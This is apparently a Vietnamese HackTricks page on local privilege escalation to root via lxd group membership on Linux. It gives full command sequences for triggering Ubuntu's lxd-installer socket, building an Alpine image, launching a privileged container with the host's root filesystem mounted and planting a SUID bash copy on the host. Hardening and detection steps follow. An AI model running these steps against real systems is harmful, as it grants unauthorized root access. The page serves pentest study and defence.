# Nhóm lxd/lxc - Leo thang đặc quyền

{{#include ../../../banners/hacktricks-training.md}}

Thành viên trong nhóm quản lý LXD trên host (thường là _**lxd**_) có thể tạo đường dẫn lên root bằng cách cho phép toàn quyền kiểm soát daemon.<sup>[[1]](#references)</sup> Đây là vấn đề ranh giới tin cậy tương tự như mô tả trong [runtime control sockets](../../containers-namespaces/container-security/runtime-api-and-daemon-exposure.md) và [writable host mounts](../../containers-namespaces/container-security/sensitive-host-mounts.md): quyền truy cập vào management API có thể là đủ, ngay cả khi tiến trình hiện tại chưa chạy bên trong container.<sup>[[1]](#references)</sup>

## Kích hoạt socket `lxd-installer` trên Ubuntu

Đừng cho rằng thành viên của nhóm `lxd` là vô hại chỉ vì không có LXD snap. Trên Ubuntu Server 24.04 trở lên, gói `lxd-installer` được cài sẵn cung cấp `/run/lxd-installer.socket` với owner và group là `root:lxd`, cùng mode `0660`. Khi có kết nối, `lxd-installer@.service` được kích hoạt với quyền root, cài đặt LXD snap mà không cần mật khẩu sudo hoặc xác thực polkit; một số phiên bản wrapper cũng bỏ qua lời nhắc xác nhận khi standard input không phải TTY.<sup>[[10]](#references)[[11]](#references)</sup>

Kiểm tra cả tư cách thành viên tài khoản lẫn service được kích hoạt bằng socket:<sup>[[10]](#references)[[11]](#references)</sup>

```bash
id -nG
getent group lxd
stat -c '%A %U:%G %n' /run/lxd-installer.socket
systemctl cat lxd-installer.socket lxd-installer@.service
```

Một bài kiểm tra được ủy quyền với nhóm `lxd` có thể kích hoạt trình cài đặt thông qua wrapper `lxc` thông thường hoặc bằng cách kết nối trực tiếp tới socket. Cách thứ hai cho thấy ACL của Unix socket, chứ không phải lời nhắc của wrapper, mới là ranh giới phân quyền thực sự:<sup>[[10]](#references)[[11]](#references)</sup>

```bash
python3 -c 'import socket; s=socket.socket(socket.AF_UNIX); s.connect("/run/lxd-installer.socket"); s.send(b"x"); s.recv(1)'
lxc version
```

Khi daemon đã sẵn sàng, tiếp tục với các kỹ thuật privileged container bên dưới.<sup>[[10]](#references)[[11]](#references)</sup>

## Khai thác khi không có internet

### Method 1

Bạn có thể tải image Alpine từ một kho lưu trữ đáng tin cậy để sử dụng với LXD.
Image server của Canonical dành cho LXD phát hành các bản dựng hằng ngày: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
Chỉ cần tải cả **lxd.tar.xz** và **rootfs.squashfs** từ bản dựng mới nhất (tên thư mục là ngày phát hành).<sup>[[8]](#references)</sup>

Ngoài ra, bạn có thể cài đặt distrobuilder trên máy của mình theo [hướng dẫn của dự án](https://github.com/lxc/distrobuilder).<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>

```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage    

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```

Tải lên **incus.tar.xz** (**lxd.tar.xz** nếu bạn tải xuống từ máy chủ image của Canonical) và **rootfs.squashfs**, sau đó import image và tạo container.<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

> [!CAUTION]
> Nếu gặp lỗi _**Error: Không tìm thấy storage pool. Vui lòng tạo storage pool mới**_\
> Chạy **`lxd init`**, thiết lập storage pool mặc định, rồi **lặp lại** nhóm lệnh trước đó.<sup>[[2]](#references)</sup>

Cuối cùng, khởi động container và mở shell root trên filesystem của host:<sup>[[1]](#references)[[2]](#references)</sup>

```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```

Vì UID 0 trong instance đặc quyền này không được remap, nó có thể tạo payload SUID thuộc sở hữu của host thông qua root của host đã được mount. Điều này hoàn tất quá trình pivot từ container sang host thay vì để operator trong shell của container:<sup>[[10]](#references)[[11]](#references)</sup>

```bash
# From the host, write the payload through the privileged container
lxc exec privesc -- /bin/sh -c 'cp /mnt/root/bin/bash /mnt/root/rootbash && chmod 4755 /mnt/root/rootbash'

# Execute on the host; -p prevents bash from dropping the SUID-derived EUID
/rootbash -p
id
```

Đặt payload trên một filesystem hỗ trợ SUID. `/tmp` riêng thường được mount với tùy chọn `nosuid` và có thể không xuất hiện bên dưới một bind không đệ quy của `/` trên host, vì vậy đường dẫn như `/rootbash` trên filesystem gốc của host đáng tin cậy hơn cho proof này.<sup>[[10]](#references)[[11]](#references)</sup>

### Method 2

Build một image Alpine và khởi chạy với flag `security.privileged=true`, tùy chọn này ánh xạ root trong container thành root trên host; mount `/` sau đó sẽ hiển thị filesystem của host bên trong container.<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>

```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```

## Tác động phụ của AppArmor trên toàn host

Khởi chạy LXD snap cũng có thể ghi vào `/run/sysctl.d/zz-lxd.conf` và đặt cả `kernel.apparmor_restrict_unprivileged_userns` lẫn `kernel.apparmor_restrict_unprivileged_unconfined` thành `0`. Điều này làm suy yếu các hạn chế user namespace không đặc quyền của Ubuntu đối với mọi người dùng cục bộ, vì vậy hãy ghi lại các giá trị trước và sau khi kích hoạt LXD khi đánh giá host.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
cat /run/sysctl.d/zz-lxd.conf 2>/dev/null
sysctl kernel.apparmor_restrict_unprivileged_userns \
       kernel.apparmor_restrict_unprivileged_unconfined
```

## Kiểm tra và gia cố

Hãy xem tư cách thành viên `lxd` như một đặc quyền cấp root. Việc xóa một thành viên không cần thiết có hiệu lực với các phiên đăng nhập mới; gỡ `lxd-installer` hoặc che socket của nó chỉ loại bỏ cơ chế cài đặt theo yêu cầu và **không** hạn chế người dùng đã có thể truy cập daemon LXD được cài đặt.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
getent group lxd
sudo gpasswd -d <user> lxd

# Only if on-demand LXD installation is not required
sudo systemctl mask --now lxd-installer.socket
# or: sudo apt purge lxd-installer
```

Các dấu hiệu hữu ích cho thấy hệ thống có thể đã bị xâm nhập gồm các instance LXD có `security.privileged=true`, thiết bị đĩa có `source` là `/`, các kết nối bất thường đến `/run/lxd-installer.socket`, các tệp SUID mới và việc các sysctl AppArmor nêu trên chuyển từ `1` sang `0`.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
lxc list
lxc config show <instance> --expanded
find / -xdev -type f -perm -4000 2>/dev/null
```

## References

- [1] [Cách tăng cường bảo mật cho LXD](https://canonical.com/lxd/docs/latest/howto/security_harden/)
- [2] [Container và máy ảo LXD](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
- [3] [Cách sao chép và nhập image](https://canonical.com/lxd/docs/latest/howto/images_copy/)
- [4] [distrobuilder](https://github.com/lxc/distrobuilder)
- [5] [Cách build image bằng distrobuilder](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
- [6] [Định nghĩa image Alpine](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
- [7] [Script build lxd-alpine-builder](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
- [8] [Máy chủ image LXD](https://images.lxd.canonical.com/)
- [9] [Loại: disk](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
- [10] [Báo cáo và PoC về privilege escalation qua group LXD của STAR Labs](https://github.com/star-sg/lxd-group-privesc-report)
- [11] [Rượu cũ trong bình mới: Group LXD cũ hơn một thập kỷ lại được trang bị khả năng lên root](https://starlabs.sg/blog/2026/06-old-wine-in-a-new-bottle-a-decade-old-lxd-group-root-re-armed)
{{#include ../../../banners/hacktricks-training.md}}
